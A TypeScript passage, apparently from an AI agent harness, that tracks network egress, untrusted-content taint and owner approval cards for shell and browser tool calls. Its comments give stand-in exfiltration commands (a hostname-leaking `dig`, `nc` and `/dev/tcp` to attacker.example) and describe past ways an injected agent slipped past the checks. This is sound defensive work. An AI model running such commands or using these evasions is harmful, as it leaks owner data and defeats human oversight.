 * `rsync -a ./build/ deploy@docs.example.com:/srv/` = 3, the `rsync://` spelling of it = 3, and the
 * `/dev/tcp/localhost/3000` health check = 0, because loopback is somewhere data cannot go.
 *
 * Two of those cards are new here and both are the root label being taken off the name first:
 * `dig <the mailbox>.attacker.example.` and `nc attacker.example. 443` were 0 bytes and are now
 * charged exactly what the dotless spelling is charged - 34 and 10 - and the same normalisation in
 * `classifyDestination` is what stops `curl https://docs.example.com./guide` costing 10 bytes and a
 * card for a read of the owner's own host, which it did.
 *
 * AND ONE THING IT ASKS ABOUT THAT REACHES NOTHING. The socket-as-a-path scan reads the whole
 * command text, so a command that only MENTIONS one is carded: `grep -rn
 * "/dev/tcp/attacker.example/443" notes.txt` and `echo` of the same string are 10 bytes each on a
 * tainted turn. That is the literal URL scan's own behaviour beside it - `grep https://x.example/p`
 * has always carded - and it is the direction to be wrong in, but it is a card in front of a
 * command that opens no socket and it belongs on this list as plainly as the misses do.
 */

/**
 * Every address one tool call would reach, whichever tool it is.
 *
 * One list, because two of them drift: the approval floor asks what a call reaches in order to
 * judge it, and the turn's novelty budget asks the same question in order to charge it, and an
 * address only one of them knows about is either an unjudged request or an unpaid one. A batch is
 * twenty-four actions wearing one action name, so the navigate inside one is here too.
 *
 * For `shell` this reads the commands the call really runs, wrappers and interpreter off, and not
 * only the http(s) addresses spelled out in it. The literal scan stays alongside because it is the
 * one reader that works on a shape `effectiveCommands` cannot resolve at all - a script handed to
 * an interpreter as a file, an address in a program this has never heard of - and the two are
 * unioned rather than chosen between. The socket-as-a-path scan is a third reader of the same kind
 * and for the same reason: it belongs to no command at all.
 */
export const callDestinations = (name: string, args: Record<string, unknown>): string[] => {
  if (name === 'process' && args.action === 'write') {
    const options = args.options as { inputDestinations?: unknown } | undefined;
    return Array.isArray(options?.inputDestinations)
      ? options.inputDestinations.filter((url): url is string => typeof url === 'string')
      : [];
  }
  if (name === 'parallel_web_read') return Array.isArray(args.urls) ? args.urls.map(String) : [];
  if (name === 'browser_action')
    return [
      textValue(args.url),
      ...(Array.isArray(args.actions)
        ? args.actions.map((step) => textValue((step as { url?: unknown } | null)?.url))
        : [])
    ].filter(Boolean);
  if (name === 'shell' || name === 'desktop_launch') {
    const resolved = [
      ...effectiveCommands(args).flatMap(commandAddresses),
      ...devSocketAddresses(commandText(args))
    ];
    // A literal the resolved list already accounts for is the same request, not a second one:
    // `https://x/` and the `https://x/?…` that carries the header are one call and must be one
    // verdict, or the host is charged twice and named twice on the card.
    const spelled = literalUrlsInCommand(args).filter(
      (url) => !resolved.some((address) => address.startsWith(url))
    );
    return [...new Set([...resolved, ...spelled])];
  }
  return [];
};

/**
 * A command that always writes its far end down, and wrote nothing this could read.
 *
 * The third answer the network arm needs, and the one the flag used to give by accident.
 * `dig $(cat /etc/hostname).collector.invalid` is a name lookup carrying the box's hostname to a
 * host nobody named - the classic DNS channel out - and `scriptCommands` splits the command
 * substitution off, so `dig` arrives here with no operand at all and `commandAddresses` reports no
 * destination. Before the repair the arm carded it, but only incidentally: the `$(` split leaves a
 * segment beginning `cat`, `cat` is not on the allowlist, and the arm was open because the model had
 * ticked `network`. Omit the flag and the same lookup was free.
 *
 * So the arm asks this instead. A client whose whole grammar is "here is where to connect" -
 * `curl`, `ssh`, `rsync`, `dig`, `aws s3`, `openssl s_client` - that named nothing readable is a
 * request whose destination nobody can see, which is a different fact from a command that names no
 * far end because it has none (`npm install`, `git pull`, `cargo build`), and a different fact
 * again from one whose addresses were all read and cleared. `curl --version` connects to nothing
 * and is on the allowlist, so opening the arm for it costs no card; what opening the arm does is
 * let the segments be judged at all.
 */
const ADDRESS_NAMING_EXECUTABLES = new Set([
  ...FETCH_CLIENT_EXECUTABLES,
  ...CONNECTING_EXECUTABLES,
  ...REMOTE_SPEC_EXECUTABLES,
  ...OBJECT_STORE_EXECUTABLES,
  ...RESOLVING_EXECUTABLES,
  'openssl'
]);

/**
 * What makes the far end unreadable, as opposed to absent.
 *
 * A substitution or an expansion: `$(…)`, a backquote, `$U`, `${U}`. This is the difference between
 * `dig $(cat /etc/hostname).collector.invalid` - where `scriptCommands` splits the substitution off
 * and `dig` arrives with no operand at all - and `curl --version`, which has no operand because it
 * asks the local binary a question and connects to nothing. Without this clause the second one
 * carded, which is a card in front of a command that opens no socket, and `commandAddresses` says
 * in its own comment that this is the one thing a card must not do.
 */
const UNREADABLE_VALUE = /\$\(|`|\$\{?[A-Za-z_]/;

/**
 * An address `commandAddresses` handed back as it was written because it could not read it: the
 * `"$U"` of `curl -s "$U"`, the `curl` of `curl -K curlrc`, the `$P` of a proxy in a variable.
 * Every address the reader could read comes back as a URL; one that will not parse is the token.
 */
const willNotParse = (address: string): boolean => {
  try {
    new URL(address);
    return false;
  } catch {
    return true;
  }
};

export const reachesAnUnreadableFarEnd = (args: Record<string, unknown>): boolean =>
  effectiveCommands(args).some((command) => {
    if (!ADDRESS_NAMING_EXECUTABLES.has((command[0] ?? '').toLowerCase())) return false;
    const addresses = commandAddresses([...command]);
    /*
     * Two ways for the far end to be unreadable, and the second was not asked. A substitution
     * that `scriptCommands` split off leaves the client with no operand at all, which is the
     * empty case below; an operand the client kept but nobody can resolve - `"$U"`, `${U}`, a
     * file the addresses are listed in - comes back from `commandAddresses` as the token itself,
     * and a test for "no addresses" read that as an address that had been read. So on a clean turn
     * in balanced `curl -s "$U"` was free, `curl -s -K curlrc` was free, `wget -i urls.txt` was
     * free, and the card whose own text says "connects to somewhere this computer could not read
     * out of the command" was unreachable from a curl - while `curl -s $(cat u)` beside them
     * carded. The provenance arm already fails closed on the token; this is the ordinary arm
     * asking the same question.
     */
    return addresses.length
      ? addresses.some(willNotParse)
      : UNREADABLE_VALUE.test(commandText(args));
  });

/**
 * The addresses in one call that leave this computer, and the host each one reaches.
 *
 * The evidence the ordinary floor should have been reading all along. Its two network branches
 * asked `args.network === true` - what the model SAID it was about to do - and the answer decided
 * a card in balanced and review mode and the autonomous allowlist. Measured, the flag decided
 * nothing else: the runner isolates only when `policy.isolateNetwork && !request.network`, and
 * `ISOLATE_AGENT_NETWORK` ships false, so declaring it and omitting it produce the same access and
 * differed only in what the owner was asked. A model that told the truth was charged for it.
 *
 * This asks the harness's own reader instead, with an empty corpus, so the question is only
 * "does this request leave the computer" and not "is this address novel" - novelty is the tainted
 * turn's budget and it is asked separately, with the turn's real corpus, in `taintedRequirement`.
 * `http://localhost:5173/api/health` and this box's own origin come back empty; `github.com`,
 * `registry.example` and an operand that will not parse come back named.
 */
export const outboundDestinations = (
  name: string,
  args: Record<string, unknown>,
  selfOrigins: readonly string[] = []
): { address: string; host: string }[] =>
  callDestinations(name, args)
    .map((address) => ({
      address,
      verdict: classifyDestination(address, {
        knownOrigins: [],
        knownAddresses: [],
        ownerText: '',
        selfOrigins,
        spentNoveltyBytes: 0
      })
    }))
    /*
     * The internet only, said out loud rather than inherited.
     *
     * `verdict.sink` used to mean the internet by accident: `classifyDestination` cleared every
     * private, link-local and `*.internal` address before it judged anything, so a filter on `sink`
     * and a filter on "leaves for the internet" were the same filter. They are not any more - the
     * estate is charged and judged there now - and the difference lands here, on the arm that
     * decides whether BALANCED asks about a command on a clean turn.
     *
     * Kept narrow on purpose, so that this change moves no card on a turn nothing hostile has been
     * read in. The provenance floor reads `classifyDestination` directly and does gate the estate,
     * which is where a bound can be argued from evidence; widening THIS line would card a
     * self-hosted owner's ordinary traffic to their own NAS in balanced mode, and that is a
     * judgement about how often that happens rather than a bound anything here enforces. It is one
     * clause, and a wave that can measure it can delete it - see docs/design/gaps/NETWORK.md.
     */
    .filter(({ verdict }) => verdict.sink && verdict.reach === 'internet')
    .map(({ address, verdict }) => ({ address, host: verdict.host }));

/**
 * Where the browser and the network-reaching commands drop what they fetched.
 *
 * Everything under it is bytes somebody else wrote, sitting in the owner's own workspace, which is
 * the one place the "reads of the owner's computer are not tainted" rule has to make an exception
 * for. Declared here rather than beside the classifier in the agent loop because both the file
 * readers and `shell` have to agree on it, and two lists would drift.
 */
/**
 * The flags a server is told to listen on an address with.
 *
 * The short ones are here despite `-a`, `-l` and `-i` meaning something else on half the commands
 * that take them, because nothing is read off the flag alone: `bindOperandAddress` has to be able
 * to place the value before the pair counts, so `tar -a` and `nc -l 1234` fall out on the value
 * rather than needing to be named here.
 */
const BIND_FLAGS = new Set([
  '--bind',
  '--bind-address',
  '--host',
  '--hostname',
  '--address',
  '--addr',
  '--listen',
  '--listen-address',
  '--http-address',
  '--interface',
  '-b',
  '-H',
  '-a',
  '-l'
]);

/** The environment names a server reads a listen address out of when no flag carries it. */
const BIND_ASSIGNMENTS =
  /^(HOST|HOSTNAME|BIND|BIND_ADDRESS|BIND_HOST|ADDRESS|LISTEN|LISTEN_ADDRESS|SERVER_HOST|HTTP_HOST)=(.*)$/i;

/**
 * The address inside one operand, or null when this cannot say the operand is an address at all.
 *
 * NULL IS THE IMPORTANT RETURN. It is "not stated here", and it is what keeps a heuristic flag
 * table from inventing exposure: `--host production` is a word that cannot be bound, `-l 1234` is
 * a port, and both have to come back null rather than fail wide, because the caller escalates on
 * what this returns. The fail-wide rule belongs one level up, in `reachOfBindAddress`, where the
 * value is already known to be an address.
 *
 * So a bare name is taken only when it can actually be placed - `localhost`, and the estate
 * suffixes - and any other single word is refused. The cost is a bind to a public HOSTNAME, which
 * would have to resolve to an interface this box already holds; the gain is that no ordinary
 * service declaration is carded for a word that was never an address.
 */
const bindOperandAddress = (raw: string): string | null => {
  let value = raw.trim();
  if (!value) return null;
  const scheme = value.match(/^[a-z][a-z0-9+.-]*:\/\/(.*)$/i);
  if (scheme) value = scheme[1] ?? '';
  value = value.replace(/\/.*$/, '');
  if (!value) return null;
  const bracketed = value.match(/^\[([^\]]*)\](?::\d+)?$/);
  if (bracketed) return bracketed[1] ?? '';
  // `--listen :8080` and `--listen *:8080`: a port with no address is every interface.
  if (/^:\d+$/.test(value)) return '';
  if (/^\*(?::\d+)?$/.test(value)) return '*';
  const segments = value.split(':');
  if (segments.length === 2 && /^\d+$/.test(segments[1] ?? '')) value = segments[0] ?? '';
  else if (segments.length > 2 && !isIP(value)) return null;
  if (!value) return '';
  if (isIP(value)) return value;
  return reachOfBindAddress(value) === 'internet' ? null : value;
};

/** An operand that carries its own port is a listen address wherever it sits: `php -S 0.0.0.0:80`. */
const addressWithPort = (raw: string): string | null => {
  const value = raw.trim().replace(/^[a-z][a-z0-9+.-]*:\/\//i, '');
  if (!/:\d+$/.test(value) && !/^\[[^\]]*\]:\d+$/.test(value)) return null;
  return bindOperandAddress(raw);
};

const commandBindAddresses = (tokens: readonly string[]): string[] => {
  const found: string[] = [];
  for (let index = 0; index < tokens.length; index += 1) {
    const token = unquoted(tokens[index] ?? '');
    const assignment = token.match(BIND_ASSIGNMENTS);
    if (assignment) {
      /*
       * Up to the first space, and its own quotes off. `HOST=0.0.0.0 npm start` arrives here as a
       * single token whenever the shell parser ahead of this one dropped the assignment prefix
       * rather than splitting on it, and reading the whole tail as the address answered null for
       * the plainest spelling of the case this exists to catch.
       */
      const stated = (assignment[2] ?? '').trim().split(/\s+/)[0] ?? '';
      const address = bindOperandAddress(stated.replace(/^["']|["']$/g, ''));
      if (address !== null) found.push(address);
      continue;
    }
    const split = token.indexOf('=');
    const flag = split > 0 ? token.slice(0, split) : token;
    // Short flags are matched case-sensitively on purpose: `-H` is a bind on several servers and
    // `-h` is help on nearly all of them, and folding the case made the first unreadable.
    const isBindFlag =
      BIND_FLAGS.has(flag) || (flag.startsWith('--') && BIND_FLAGS.has(flag.toLowerCase()));
    if (!isBindFlag) {
      const positional = addressWithPort(token);
      if (positional !== null) found.push(positional);
      continue;
    }
    if (split > 0) {
      const address = bindOperandAddress(token.slice(split + 1));
      if (address !== null) found.push(address);
      continue;
    }
    const next = tokens[index + 1];
    /*
     * `vite --host` with nothing after it is documented as every interface, and a bind flag whose
     * value is the next flag is the same statement. The flag was named; only the value is missing.
     *
     * LONG SPELLINGS ONLY, which is the whole of the difference between a rule and a guess.
     * `tar -a -c -f out.tar` was read as a public bind by the version above: `-a` is in the table
     * for http-server, `-c` begins with a dash, and an archive became a socket on every interface.
     * A short flag with no value is not evidence of anything.
     */
    if (next === undefined || unquoted(next).startsWith('-')) {
      if (flag.startsWith('--')) found.push('');
      continue;
    }
    const address = bindOperandAddress(unquoted(next));
    if (address !== null) {
      found.push(address);
      index += 1;
    }
  }
  return found;
};

/**
 * The widest reach any address stated in this invocation opens, or null when none was stated.
 *
 * WIDEST rather than first, because a declaration that says both is only as private as its most
 * open half: `bash -lc 'npm run build -- --host 127.0.0.1 && npm start -- --host 0.0.0.0'` is a
 * public port, and reading the first would have called it loopback.
 *
 * Null is a real answer and its own case. Most servers say where they listen in their own source -
 * `npm start` states nothing here - so this cannot be the only place the question is asked, and
 * the caller must not read null as loopback. What the service actually bound is observed after it
 * starts; this is the half that can be known before the owner is asked.
 */
export const statedBindReach = (args: Record<string, unknown>): NetworkReach | null => {
  const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
  const invocations: readonly (readonly string[])[] = [
    [textValue(args.executable), ...commandArgs],
    ...effectiveCommands(args)
  ];
  const order: readonly NetworkReach[] = ['self', 'estate', 'internet'];
  let widest: NetworkReach | null = null;
  for (const tokens of invocations)
    for (const address of commandBindAddresses(tokens)) {
      const reach = reachOfBindAddress(address);
      if (widest === null || order.indexOf(reach) > order.indexOf(widest)) widest = reach;
    }
  return widest;
};

export const DOWNLOAD_QUARANTINE_PREFIXES = [
  'workspace/downloads/',
  'downloads/',
  // The attachment directory is the same fact by another route. context.ts tells the model, in the
  // always-resident operating contract, to save an attachment into the workspace before reading it
  // there, and agent.ts saves it here - so the bytes a stranger e-mailed arrived in the workspace
  // wearing the owner's own clothes. The connector read taints the turn that fetched it; a later
  // task reading the file back was judged clean, and on a clean turn the egress budget is not
  // charged, a write to ATHANOR.md raises no card and a read of any host raises no card.
  'workspace/mail/',
  'mail/'
];

/*
 * A workspace path as the quarantine rule compares it.
 *
 * NORMALISED, not merely stripped, and that is the whole of this function. It used to be
 * `path.replace(/^\.?\//, '')` - leading `./` or `/` removed and nothing else - while the RUNNER
 * resolves the same string with `path.resolve` before opening it. So two spellings of one file
 * disagreed about whether reading it taints the turn, and the model chooses the spelling. Measured
 * against the shipped predicate: `workspace/downloads/inbound/a.json` was quarantined and
 * `workspace/./downloads/inbound/a.json` and `workspace//downloads/inbound/a.json` were not, while
 * all three open the same bytes. One inserted character bought a read of a stranger's file on a
 * turn the floor then judged clean - no egress charge, no card on a write to ATHANOR.md, no card on
 * a read of any host.
 *
 * `path.posix.normalize` is what the comparison needed and `path.resolve` is not: resolve would
 * anchor a relative path to this process's working directory, which is the worker's and not the
 * workspace's. A leading `/` is stripped first because the model writes both spellings for the same
 * workspace-relative file, and `..` is left to normalize, which collapses what it can and leaves a
 * leading `../` it cannot - a path that climbs out of the workspace is refused by `resolveInside`
 * in the runner long before it is read, so it is not this predicate's job to judge it.
 */
const quarantineRelative = (path: string): string =>
  posix.normalize(path.replace(/^\.?\//, '')).replace(/^\.\//, '');

export const isQuarantinedDownloadPath = (path: string): boolean =>
  DOWNLOAD_QUARANTINE_PREFIXES.some((prefix) => quarantineRelative(path).startsWith(prefix));

/**
 * Git subcommands that talk to a remote. The rest of git is local history, and a rule that treated
 * `git status` as a network read would taint most of the repository work this product exists for.
 */
const NETWORK_GIT_SUBCOMMANDS = new Set([
  'clone',
  'fetch',
  'pull',
  'ls-remote',
  'submodule',
  'archive'
]);

/**
 * Commands whose whole purpose is to bring back what is at the other end of a connection. Unlike
 * git and the package managers there is no local mode to distinguish, so the executable settles it.
 */
const NETWORK_CLIENT_EXECUTABLES = new Set([
  'aria2c',
  'curl',
  'ftp',
  'gh',
  'http',
  'httpie',
  'nc',
  'ncat',
  'netcat',
  'scp',
  'sftp',
  'socat',
  'ssh',
  'wget',
  'yt-dlp',
  'youtube-dl'
]);

/**
 * Where the untrusted content in a `shell` result came from, or null when the command only touched
 * the owner's own computer.
 *
 * Two channels, both reachable by an attacker and neither of them labelled until now.
 *
 * The first is the command that fetches. `network: true` was the whole test, and it is a
 * declaration rather than a gate: the installer ships the per-command namespace off, because a
 * command with its own loopback breaks published previews, so `curl https://attacker.example/brief`
 * reaches the internet whether or not the model ticked the box - and a model following an injected
 * instruction has every reason not to tick it. So the invocation is judged instead: a client whose
 * only job is to fetch, a git subcommand that talks to a remote, a package manager installing or
 * updating, or an http(s) address named anywhere in the command including inside an inline script.
 * The last one is what covers `python3 -c` and every interpreter after it without naming any of
 * them. What is deliberately not here is the rest of git, the rest of the package managers, and
 * every build and test command - `git status` and `pnpm test` read nothing from outside, and a
 * floor that rose on them would raise a card on the ordinary work and be tapped through.
 *
 * AND THE FLAG IS NO LONGER HERE AT ALL, which is the repair this comment used to describe half of.
 * It said the invocation is judged INSTEAD, and then went on testing `args.network === true` first,
 * so the declaration was still sufficient on its own: `npm run dev --network` marked the turn as
 * having read untrusted content, `npm run dev` without it did not, and the two commands run the
 * same program with the same access. The turn tainted itself installing its own dependencies -
 * measured on `L-no-research-build`, a build that reads nothing anybody else wrote, five cards in
 * autonomous against two for the same thirty-five calls with the field left out, the first of them
 * charged to the model for telling the truth about needing a registry, which the tool description
 * tells it to do. Taint now follows what was READ. `npm install` still taints, because it really
 * does fetch from a registry; `npm run dev` does not, because nothing came back that anyone else
 * wrote.
 *
 * A fetch that names where it went is judged by where it went, and by LOOPBACK rather than by the
 * egress classifier's idea of a sink - see `readsAnotherComputer` for why those are opposite
 * questions and what asking the wrong one cost. `curl http://localhost:5173/health` reads this
 * computer's own dev server and a turn does not become untrusted by reading its own output; a read
 * of `http://wiki.internal/runbook` is somebody else's machine and taints. A fetch that names
 * nothing readable - `npm install`, `git pull`, `pip install`, whose remote lives in configuration
 * rather than in the command - still taints, because nothing here can say the bytes were the
 * owner's. And `curl -s "$U"` taints, because the operand it wrote and this could not read comes
 * back from `commandAddresses` as an address that will not parse, which `readsAnotherComputer` calls
 * another computer. Unreadable fails closed; cleared does not.
 *
 * The second is the download directory. `file_read`, `document_read` and `image_read` have always
 * treated it as quarantine; `shell` did not, so `cat workspace/downloads/terms.txt` put the same
 * bytes into the same window with the floor still reporting the turn as clean.
 */
/**
 * Whether one resolved command brings bytes back from outside this computer.
 *
 * Asked of a command rather than of an invocation, so the same three tests apply to `curl …`, to
 * the `curl` inside `bash -lc '…'`, and to the `curl` inside `timeout 30 …`.
 */
/**
 * An install told to stay on this computer, or handed only files that are already on it.
 *
 * `pip install -e .`, `pip install ./dist/x.whl` and `npm install --offline` install the owner's
 * own tree, and each was marked as bringing back somebody else's bytes on the strength of the verb
 * alone. An operand is local when it is spelled as a path or as an archive; a name (`requests`) or
 * a requirements file still resolves against an index and still taints. The editable install may
 * still fetch the dependencies the tree names - that is the same bytes `pip install requests`
 * brings back for its dependencies, and the operand the owner wrote is their own directory, which
 * is the thing this reader is asked about.
 */
const OFFLINE_INSTALL_OPTIONS = new Set(['--offline', '--no-index', '--prefer-offline']);

/**
 * The options that make a network client print about itself instead of connecting. Case matters:
 * `curl -V` is the version and `curl -v` is a verbose fetch.
 */
const INFORMATIONAL_CLIENT_OPTIONS = new Set(['-V', '--version', '-h', '--help', '-M', '--manual']);
const LOCAL_INSTALL_OPERAND =
  /^(?:\.{1,2}(?:\/|$)|\/|~|file:)|\.(?:whl|tgz|tar\.gz|zip|gem|crate|deb|rpm)$/;
const installsOnlyLocalFiles = (rest: readonly string[]): boolean => {
  if (rest.some((argument) => OFFLINE_INSTALL_OPTIONS.has(argument.toLowerCase()))) return true;
  const verbAt = rest.findIndex((argument) => packageInstallCommands.has(argument.toLowerCase()));
  const operands = rest
    .slice(verbAt + 1)
    .map(unquoted)
    .filter((argument) => argument && !argument.startsWith('-'));
  return operands.length > 0 && operands.every((operand) => LOCAL_INSTALL_OPERAND.test(operand));
};

const fetchesRemoteContent = (command: readonly string[]): boolean => {
  const [executable = '', ...rest] = command;
  const name = executable.toLowerCase();
  const addresses = commandAddresses([...command]);
  const reaches =
    /*
     * A client asked for its version or its manual prints and exits. `curl --version`,
     * `curl -V`, `curl --help` and `wget --version` open no socket, and each was 'network command
     * output' on the strength of the executable's name alone - after which the turn reported
     * itself tainted and every write after it was carded. Keyed on the option and not on the
     * absence of an operand, because a bare `curl` at the end of an `xargs` reads its operands
     * off the pipe and does reach somewhere.
     */
    (NETWORK_CLIENT_EXECUTABLES.has(name) &&
      !rest.some((argument) => INFORMATIONAL_CLIENT_OPTIONS.has(argument))) ||
    /*
     * Two clients that only reach the network on some of their invocations, asked of the one reader
     * that knows their grammar rather than of a second copy of it.
     *
     * `openssl s_client` is a TLS client under another name and prints back whatever the far end
     * says, while `openssl rand` and `openssl x509` are arithmetic on local files; `aws s3 cp
     * s3://somebody-elses/brief.md .` brings back bytes the owner did not write, while
     * `aws --version` brings back nothing. Both questions are already answered by whether the
     * command names a far end at all, so asking `commandAddresses` is what keeps the taint and the
     * destination from ever disagreeing - and it is what keeps `openssl s_client -help`, which
     * connects to nothing, off a turn's provenance.
     */
    ((name === 'openssl' || OBJECT_STORE_EXECUTABLES.has(name)) && addresses.length > 0) ||
    (name === 'git' && NETWORK_GIT_SUBCOMMANDS.has(gitSubcommand([...rest]) ?? '')) ||
    (packageRemovalExecutables.has(name) &&
      rest.some((argument) => packageInstallCommands.has(argument.toLowerCase())) &&
      !installsOnlyLocalFiles(rest));
  /*
   * And then where it went, for the clients that write their far end down.
   *
   * A command that named its destinations and named only loopback read this computer - loopback
   * and not the private ranges, which are other people's machines. `curl http://localhost:5173/api/health` is the agent looking at
   * the dev server it just started - the resident contract tells it to check - and calling that a
   * read of untrusted content marked the rest of the turn as hostile on the strength of the
   * harness's own output. Named nothing readable (`npm install`, `git pull`) still counts: the
   * remote is in configuration and nothing here can say whose bytes came back. Named something
   * unreadable (`curl -s "$U"`) counts too, because `commandAddresses` hands back the operand it
   * could not read and `readsAnotherComputer` calls an address that will not parse somebody else's.
   */
  return reaches && (!addresses.length || addresses.some(readsAnotherComputer));
};

export const untrustedShellOrigin = (args: Record<string, unknown>): string | null => {
  const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
  const script = commandScript(args);
  const commands = effectiveCommands(args);
  /*
   * The invocation used to be judged at its outer executable, with a scan for a literal http(s)
   * address as the only thing that reached inside a script. That scan is what made the hole look
   * closed: `bash -lc 'curl https://x'` names an address, so it tainted. Take the address out of
   * the command - which every real script does the moment the URL sits in a variable, and which an
   * injected instruction has every reason to do - and the interpreter was an unknown executable
   * running an unknown command. `bash -lc 'curl -s "$U" -o page.html'` read an attacker-chosen page
   * into the turn, `shellDestinations` found no address to charge to the novelty budget, and the
   * floor went on reporting the turn clean: no egress card on what left afterwards, and a write to
   * the brief with no card either. The address scan stays, because it catches the shapes this
   * cannot resolve; it is no longer the only thing looking past the wrapper.
   */
  /*
   * The literal scan and not `callDestinations`, and the difference is the question rather than an
   * oversight. That one asks where a request goes, so it reads a name lookup and a bare host as the
   * destinations they are; this one asks whether somebody else's bytes came back into the window,
   * and a `ping` sends far more than it returns. Widening this to the same reader would mark a turn
   * as having read untrusted content because it checked whether a host was reachable, and taint is
   * the input to every other floor in this file.
   */
  if (
    commands.some(fetchesRemoteContent) ||
    /*
     * The literal scan, for every command that could have opened a socket and for no other. It
     * is the one reader that reaches an address inside `python3 -c`, `node -e` and every
     * interpreter this file does not parse, and it stays for that. What it must not do is mark a
     * turn for MENTIONING an address: `echo http://192.168.1.50/notes`, `grep -r
     * "http://wiki.internal" src/`, `git commit -m "point config at http://wiki.internal/…"` and
     * `export http_proxy=http://10.0.0.5:3128` each open nothing and each was 'network command
     * output', after which a write to the brief on the same turn was carded as a tainted write.
     * So the scan is asked only when some command in the call is one whose socket this file
     * cannot rule out - an interpreter, a program it has never heard of - and not when every
     * command is a builtin, a coreutil that reads files, a file writer, or git off the network.
     */
    (commands.some(mayOpenASocket) && literalUrlsInCommand(args).some(readsAnotherComputer)) ||
    // A socket opened for reading is a client with no executable at all. See DEV_SOCKET_READ for
    // why the write-only spelling is not one.
    (DEV_SOCKET_READ.test(script) && devSocketAddresses(script).some(readsAnotherComputer))
  )
    return 'network command output';
  /*
   * The download directory, read by the commands that READ it. A path under it is somebody else's
   * bytes only once a command puts them in the window: `ls -la workspace/downloads/`, `stat`,
   * `rm`, `test -f` answer a question about the file and show none of it, and a redirect INTO
   * the directory writes rather than reads. Each of those was 'downloaded file …' on the path
   * alone. The operands of every other command are read - split on the same separators the
   * durable-path rule uses, so a redirect or a pipe inside an inline script cannot hide the path
   * the way `cat < downloads/x` would past a bare argument scan - and a call this could not
   * decompose at all is scanned whole, as it was, because unreadable fails closed.
   */
  const tokens = commands.length
    ? commands
        .filter(([executable = '']) => !METADATA_ONLY_EXECUTABLES.has(executable.toLowerCase()))
        .flatMap(([, ...rest]) => withoutWriteRedirects(rest))
        .flatMap((token) => token.split(/[\s'"`>|;()<]+/))
        .filter(Boolean)
    : [...commandArgs, ...script.split(/[\s'"`>|;()<]+/)].filter(Boolean);
  const quarantined = tokens.find(isQuarantinedDownloadPath);
  return quarantined ? `downloaded file ${quarantineRelative(quarantined)}` : null;
};

/**
 * Commands whose only relation to a file is its name, size or existence - none of its bytes reach
 * the window. Deliberately small, and `mv` and `cp` are deliberately absent: both carry the
 * bytes somewhere the quarantine rule cannot see, and the taint on the move is the one time the
 * floor is looking.
 */
const METADATA_ONLY_EXECUTABLES = new Set([
  '[',
  'basename',
  'chmod',
  'chown',
  'dirname',
  'du',
  'file',
  'ls',
  'mkdir',
  'readlink',
  'realpath',
  'rm',
  'rmdir',
  'stat',
  'test',
  'touch',
  'unlink'
]);

/** A command's tokens with the target of every writing redirect taken out. `<` is a read and stays. */
const withoutWriteRedirects = (tokens: readonly string[]): string[] => {
  const kept: string[] = [];
  for (let at = 0; at < tokens.length; at += 1) {
    const token = tokens[at] ?? '';
    if (/^(?:\d|&)?>>?\|?$/.test(token)) {
      at += 1;
      continue;
    }
    if (/^(?:\d|&)?>/.test(token)) continue;
    kept.push(token);
  }
  return kept;
};

/**
 * Whether a command is one this file cannot say opens no socket. The builtins and the coreutils
 * that read or write files are named; git is named when its subcommand stays off the network; an
 * assignment alone runs nothing. Everything else - an interpreter, a program with no table here -
 * might, and for those the literal address scan is the reader.
 */
const mayOpenASocket = ([executable = '', ...rest]: readonly string[]): boolean => {
  const name = executable.toLowerCase();
  if (name === 'git') return NETWORK_GIT_SUBCOMMANDS.has(gitSubcommand([...rest]) ?? '');
  return !(
    noEgressExecutables.has(name) ||
    READ_ONLY_EXECUTABLES.has(name) ||
    FILE_WRITING_EXECUTABLES.has(name)
  );
};

/* ---------------------------------------- past a word this file has never heard of ------------ */

/**
 * Every program name any table in this file can place.
 *
 * Not a security boundary and not a list of safe things - it is the stopping condition for the
 * walk below, and the only property it needs is that a name on it is a program this file has an
 * opinion about rather than a wrapper it has never seen. `git`, `echo`, `cat`, `grep` and `curl`
 * are all here, which is what keeps `git commit -m "npm publish"` and `echo npm publish` from
 * raising a publish card: the walk stops at the first word it can name.
 */
const placeableExecutable = (name: string): boolean =>
  READ_ONLY_EXECUTABLES.has(name) ||
  noEgressExecutables.has(name) ||
  FILE_WRITING_EXECUTABLES.has(name) ||
  consequentialExecutables.has(name) ||
  SIGNALLING_EXECUTABLES.has(name) ||
  packageRemovalExecutables.has(name) ||
  safeNetworkExecutables.has(name) ||
  commandInterpreters.has(name) ||
  RESOLVING_EXECUTABLES.has(name) ||
  FETCH_CLIENT_EXECUTABLES.has(name) ||
  CONNECTING_EXECUTABLES.has(name) ||
  REMOTE_SPEC_EXECUTABLES.has(name) ||
  OBJECT_STORE_EXECUTABLES.has(name) ||
  NETWORK_CLIENT_EXECUTABLES.has(name) ||
  ADDRESS_NAMING_EXECUTABLES.has(name) ||
  REGISTRY_PUBLISH_OPERATIONS.has(name) ||
  DEPLOYMENT_OPERATIONS.has(name) ||
  namesAStoreOrASchedule(name);

/**
 * What this command publishes, however many words were put in front of it.
 *
 * THE BOUND, and the reason `COMMAND_RUNNERS` above is not one. A card keyed on the head of a
 * command is defeated by any word that can precede a command, and the set of such words cannot be
 * enumerated: `sudo` and `xargs` can be named, a shell function, an alias and a wrapper script on
 * PATH cannot. So the walk does not ask which wrappers exist. It asks the opposite question -
 * whether this file can NAME the word it is looking at - and keeps reading while the answer is no.
 *
 * That inversion is what makes the rule cheap to be wrong about in the only direction that matters.
 * A word it cannot name might be a wrapper, so it reads on and may raise a card the bare form would
 * have raised anyway; a word it CAN name ends the walk immediately, so every ordinary command in an
 * owner's day - which is made of words this file names - is judged exactly as it was before. Driven
 * over the fourteen scenarios in `evals/cards`, in all three modes, clean and tainted: not one card
 * moves that is not a publish.
 *
 * `sudo npm publish` does not need this - `sudo` is a runner now and comes off upstream. What needs
 * it is `deploy-prod npm publish`, `np` where `np` is an alias for `npm publish`, and whatever the
 * next wrapper is called. The limit is written down rather than implied: an alias or function whose
 * BODY holds the operation, and a container that runs it on another machine
 * (`docker run img npm publish`), are past what any reader of this command's text can see, and
 * `docs/design/gaps/BYPASS.md` records both.
 */
export const publishingOperation = (
  tokens: readonly string[]
): { readonly kind: 'registry' | DeploymentKind; readonly operation: string } | null => {
  for (const [index, token = ''] of tokens.entries()) {
    const name = (unquoted(token).split('/').pop() ?? '').toLowerCase();
    if (!name) continue;
    const rest = tokens.slice(index + 1);
    const registry = registryPublishOperation(name, rest);
    if (registry) return { kind: 'registry', operation: registry };
    const deployment = deploymentOperation(name, rest, index === 0);
    if (deployment) return deployment;
    // `ssh host npm publish` publishes from the far end with the far end's credentials, and the walk
    // stopped dead at `ssh`, which `placeableExecutable` names. Read the remote command instead - the
